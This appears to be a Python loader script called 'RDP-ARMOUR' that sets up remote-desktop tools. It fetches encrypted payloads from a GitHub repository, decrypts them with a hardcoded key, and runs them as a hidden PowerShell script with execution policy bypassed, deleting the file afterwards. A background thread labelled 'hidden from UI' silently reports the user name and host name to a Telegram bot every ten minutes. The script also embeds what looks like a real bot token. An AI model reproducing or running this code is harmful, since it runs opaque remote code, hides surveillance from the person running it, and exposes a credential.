import base64
import requests
import subprocess
import os
import sys
import time
import platform
import datetime
import threading
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet

# --- CONFIGURATION (MR.English2008 - RDP-ARMOUR) ---
MASTER_KEY = "ME2008#"
# Corrected GitHub Raw Path based on your successful wget test
BASE_URL = "https://raw.githubusercontent.com/salemmox1/RDP-ARMOUR/refs/heads/main/" 
SALT = b'ME_SALT_2026'

# --- TELEGRAM CONFIG (HIDDEN FROM UI) ---
# Replace with your actual credentials
BOT_TOKEN = "7870481428:AAHj-WEyGPfNIvdmjGfuUKpkZDChEpHghDg"
CHAT_ID = "5749168913"

def telegram_worker(user, node, tool, start_time):
    """Background thread for silent Telegram reporting and uptime updates."""
    def send_tg(msg, msg_id=None):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
            url += "editMessageText" if msg_id else "sendMessage"
            payload = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"}
            if msg_id:
                payload["message_id"] = msg_id
            r = requests.post(url, data=payload, timeout=10).json()
            return r["result"]["message_id"] if r.get("ok") else None
        except:
            return None

    # Initial Deployment Report
    msg_id = send_tg(f"🚀 *RDP-ARMOUR Engaged*\n👤 *User:* `{user}`\n💻 *Node:* `{node}`\n🛠 *Tool:* `{tool}`\n📅 *Start:* `{start_time}`")
    
    if not msg_id:
        return

    # Hidden Uptime Loop
    start_tick = time.time()
    while True:
        time.sleep(600)  # Updates every 10 minutes
        uptime_sec = int(time.time() - start_tick)
        uptime_str = str(datetime.timedelta(seconds=uptime_sec))
        
        status_update = (
            f"✅ *Session Active (RDP-ARMOUR)*\n"
            f"👤 *User:* `{user}`\n"
            f"💻 *Node:* `{node}`\n"
            f"🛠 *Tool:* `{tool}`\n"
            f"⏳ *Live Uptime:* `{uptime_str}`"
        )
        send_tg(status_update, msg_id)

def decrypt_data(data):
    """Decrypts encrypted .enc files using the Master Key."""
    try:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=SALT,
            iterations=100000
        )
        key = base64.urlsafe_b64encode(kdf.derive(MASTER_KEY.encode()))
        cipher = Fernet(key)
        return cipher.decrypt(data).decode('utf-8')
    except:
        return None

def fetch_file(filename):
    """Downloads files from the RDP-ARMOUR repository."""
    try:
        response = requests.get(f"{BASE_URL}{filename}", timeout=25)
        if response.status_code == 200:
            return response.content
    except:
        pass
    return None

def main():
    print(">>> RDP-ARMOUR ENGINE BY MR.English2008")
    
    # Environment Detection
    user_name = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
    node_name = platform.node()
    selected_tool = os.getenv("CHOSEN_TOOL", "none").upper()
    start_timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Start the hidden Telegram reporter in a separate thread
    threading.Thread(
        target=telegram_worker, 
        args=(user_name, node_name, selected_tool, start_timestamp), 
        daemon=True
    ).start()

    # --- USER VISIBLE PROCESS ---
    
    # Step 1: Network Core (Mandatory)
    print(f"[1/4] Downloading Network Core (ts.enc)...", end=" ", flush=True)
    ts_enc_data = fetch_file("ts.enc")
    ts_script = decrypt_data(ts_enc_data) if ts_enc_data else None
    
    if ts_script:
        print("DONE")
    else:
        print("FAILED")
        sys.exit(1)

    # Step 2: Tool Selection logic
    # Ensure these names match exactly with files in your GitHub repo
    tool_map = {
        "rdp": "rdp.enc",
        "rustdesk": "rd.enc",
        "anydesk": "ad.enc",
        "nomachine": "nomachine.enc",
        "novnc": "novnc.enc",
        "vnc": "vnc.enc",
        "avica": "avica.enc"
    }
    
    selected_lower = selected_tool.lower()
    tool_script = ""
    
    if selected_lower in tool_map:
        target_filename = tool_map[selected_lower]
        print(f"[2/4] Downloading Tool: {selected_tool} ({target_filename})...", end=" ", flush=True)
        tool_enc_data = fetch_file(target_filename)
        tool_script = decrypt_data(tool_enc_data) if tool_enc_data else ""
        if tool_script:
            print("DONE")
        else:
            print("DECRYPTION ERROR")
    else:
        print(f"[2/4] No additional tool selected. SKIPPING.")

    # Step 3: Merging Payloads
    print("[3/4] Initializing Decryption Engine...", end=" ", flush=True)
    final_payload = ts_script + "\n" + tool_script
    print("DONE")

    # Step 4: Silent Execution
    print("[4/4] Deploying System Components...", end=" ", flush=True)
    temp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")
    temp_ps1 = os.path.join(temp_dir, "rdp_armour_init.ps1")
    
    try:
        with open(temp_ps1, "w", encoding="utf-8") as f:
            f.write(final_payload)
            
        # Execute the combined script silently
        subprocess.run([
            "powershell", "-ExecutionPolicy", "Bypass", 
            "-WindowStyle", "Hidden", "-File", temp_ps1
        ], creationflags=0x08000000)
        print("SUCCESS")
    except Exception as e:
        print(f"FAILED: {str(e)}")
    finally:
        if os.path.exists(temp_ps1):
            os.remove(temp_ps1)

    print(f"\n>>> SYSTEM ONLINE | APP: {selected_tool}")

    # Keep the main thread alive for the background Telegram reporter
    try:
        while True:
            time.sleep(100)
    except KeyboardInterrupt:
        print("\n>>> SHUTTING DOWN")

if __name__ == "__main__":
    # Ensure critical dependencies are installed silently
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "requests", "cryptography", "--quiet"], 
        creationflags=0x08000000
    )
    main()